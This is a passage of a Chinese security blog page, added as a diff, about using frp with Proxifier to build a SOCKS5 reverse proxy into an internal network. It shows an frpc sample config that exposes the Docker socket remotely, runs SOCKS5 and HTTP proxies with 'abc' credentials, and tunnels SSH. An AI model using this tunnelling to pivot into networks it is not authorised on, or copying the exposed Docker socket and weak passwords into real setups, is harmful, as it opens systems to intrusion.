+health_check_interval_s &#x3D; 10
+health_check_max_failed &#x3D; 3
+health_check_timeout_s &#x3D; 3
+
+[web02]
+type &#x3D; https
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 8000
+use_encryption &#x3D; false
+use_compression &#x3D; false
+subdomain &#x3D; web01
+custom_domains &#x3D; web02.yourdomain.com
+# v1 或 v2 或 空
+proxy_protocol_version &#x3D; v2
+
+[plugin_unix_domain_socket]
+type &#x3D; tcp
+remote_port &#x3D; 6003
+plugin &#x3D; unix_domain_socket
+plugin_unix_path &#x3D; &#x2F;var&#x2F;run&#x2F;docker.sock
+
+[plugin_http_proxy]
+type &#x3D; tcp
+remote_port &#x3D; 6004
+plugin &#x3D; http_proxy
+plugin_http_user &#x3D; abc
+plugin_http_passwd &#x3D; abc
+
+[plugin_socks5]
+type &#x3D; tcp
+remote_port &#x3D; 6005
+plugin &#x3D; socks5
+plugin_user &#x3D; abc
+plugin_passwd &#x3D; abc
+
+[plugin_static_file]
+type &#x3D; tcp
+remote_port &#x3D; 6006
+plugin &#x3D; static_file
+plugin_local_path &#x3D; &#x2F;var&#x2F;www&#x2F;blog
+plugin_strip_prefix &#x3D; static
+plugin_http_user &#x3D; abc
+plugin_http_passwd &#x3D; abc
+
+[plugin_https2http]
+type &#x3D; https
+custom_domains &#x3D; test.yourdomain.com
+plugin &#x3D; https2http
+plugin_local_addr &#x3D; 127.0.0.1:80
+plugin_crt_path &#x3D; .&#x2F;server.crt
+plugin_key_path &#x3D; .&#x2F;server.key
+plugin_host_header_rewrite &#x3D; 127.0.0.1
+
+[secret_tcp]
+# 如果类型为 secret tcp, remote_port 将失效
+type &#x3D; stcp
+# sk 用来进行访客认证
+sk &#x3D; abcdefg
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 22
+use_encryption &#x3D; false
+use_compression &#x3D; false
+
+# 访客端及服务端的用户名应该相同
+[secret_tcp_visitor]
+# frpc role visitor -&gt; frps -&gt; frpc role server
+role &#x3D; visitor
+type &#x3D; stcp
+# 要访问的服务器名称
+server_name &#x3D; secret_tcp
+sk &#x3D; abcdefg
+# 将此地址连接到访客 stcp 服务器
+bind_addr &#x3D; 127.0.0.1
+bind_port &#x3D; 9000
+use_encryption &#x3D; false
+use_compression &#x3D; false
+
+[p2p_tcp]
+type &#x3D; xtcp
+sk &#x3D; abcdefg
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 22
+use_encryption &#x3D; false
+use_compression &#x3D; false
+
+[p2p_tcp_visitor]
+role &#x3D; visitor
+type &#x3D; xtcp
+server_name &#x3D; p2p_tcp
+sk &#x3D; abcdefg
+bind_addr &#x3D; 127.0.0.1
+bind_port &#x3D; 9001
+use_encryption &#x3D; false
+use_compression &#x3D; false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;t.zoukankan.com&#x2F;hackmang-p-14516969.html
+
+https:&#x2F;&#x2F;gofrp.org&#x2F;docs&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">citytwilight</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://citytwilight.github.io/2022/11/07/frp+proxifier%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91socks5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/">http://citytwilight.github.io/2022/11/07/frp+proxifier%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91socks5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">citytwilight</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F/">
+                                    <span class="chip bg-color">代理穿透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/11/25/%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E5%AE%89%E5%85%A8/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Android组件导出安全">
+                        
+                        <span class="card-title">Android组件导出安全</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            安卓app客户端测试 组件导出安全。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/APP/" class="post-category">
+                                    APP
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Android/">
+                        <span class="chip bg-color">Android</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/11/01/tmux%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="tmux的使用方法">
+                        
+                        <span class="card-title">tmux的使用方法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            tmux的使用方法。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="post-category">
+                                    工具使用
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/linux/">
+                        <span class="chip bg-color">linux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2022</span>
+            
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">citytwilight</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/citytwilight" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1473116248@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1473116248" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1473116248" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
